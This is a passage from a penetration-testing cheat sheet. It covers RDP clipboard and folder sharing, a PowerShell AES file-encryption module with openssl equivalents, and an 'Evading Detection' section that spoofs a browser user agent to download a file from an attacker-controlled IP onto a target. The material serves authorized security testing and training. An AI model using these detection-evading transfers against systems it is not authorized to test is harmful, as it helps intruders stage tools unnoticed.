Clipboard (copy-paste):

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
xfreerdp /v:<IP> /u:'<USER>' /p:'<PASSWORD>' +clipboard
```

</td>
</tr>
</table>

Share a local folder:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
xfreerdp /v:<IP> /u:'<USER>' /p:'<PASSWORD>' +clipboard /drive:share,/tmp/share
```

</td>
</tr>
</table>

> **NOTE:** The shared folder will appear as a drive on the remote Windows session.

</details>

</details>

</details>

---

<details>
<summary><h1>🔒 Protected File Transfers</h1></summary>

> **NOTE:** Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.

> **WARNING:** Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file.

<details>
<summary><h2>🪟 File Encryption on Windows</h2></summary>

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [`Invoke-AESEncryption.ps1`](../scripts/file_transfers/Invoke-AESEncryption.ps1) PowerShell script.

<details>
<summary><h3>Invoke-AESEncryption.ps1</h3></summary>

**Installation & Configuration**

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
$moduleCode = @'
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
'@

# Create the directory for the current user
$modulePath = "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt"
if (!(Test-Path $modulePath)) {
    New-Item -ItemType Directory -Path $modulePath -Force
}

# Save the module
$moduleCode | Out-File "$modulePath\AESCrypt.psm1" -Encoding utf8

# Import the module
Import-Module AESCrypt -Force
```

</td>
</tr>
</table>

> **NOTE:** To install globally (admin required), use: `$modulePath = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt"`

</details>

<details>
<summary><h3>File Encryption Examples</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
# Encrypt a string (outputs Base64 ciphertext)
Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Text "<STRING>"

# Decrypt a Base64 string (outputs plain text)
Invoke-AESEncryption -Mode Decrypt -Key "<PASSWORD>" -Text "<BASE64STRING>"

# Encrypt a file (outputs .aes file)
Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE>

# Decrypt a .aes file
Invoke-AESEncryption -Mode Decrypt -Key "<PASSWORD>" -Path <AES FILE>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Uninstall module</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
# Uninstall for current user
Remove-Module AESCrypt -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt" -Recurse -Force

# System-wide uninstall (admin required)
Remove-Module AESCrypt -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt" -Recurse -Force

# Verify Uninstallation
Get-Module AESCrypt -All | Remove-Module -ErrorAction SilentlyContinue
if (!(Test-Path "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt")) {
    Write-Output "Module completely removed"
}
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h2>🐧 File Encryption on Linux</h2></summary>

<details>
<summary><h3>openssl</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Encrypting file
openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <ENCRYPTED FILE>

# Decrypting file
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <ENCRYPTED FILE> -out <FILE>
```

</td>
</tr>
</table>

</details>

</details>

</details>

---

<details>
<summary><h1>👻 Evading Detection</h1></summary>

<details>
<summary><h2>🎭 Changing User Agent</h2></summary>

**Listing out User Agents**

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

</td>
</tr>
</table>

**Request with Chrome User Agent**

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "C:\Users\Public\<OUTPUT FILE>"
```

</td>
</tr>
</table>

</details>

</details>

---

📘 **Next step:** Continue with [Shells & Payloads](./05-shells-payloads.md)
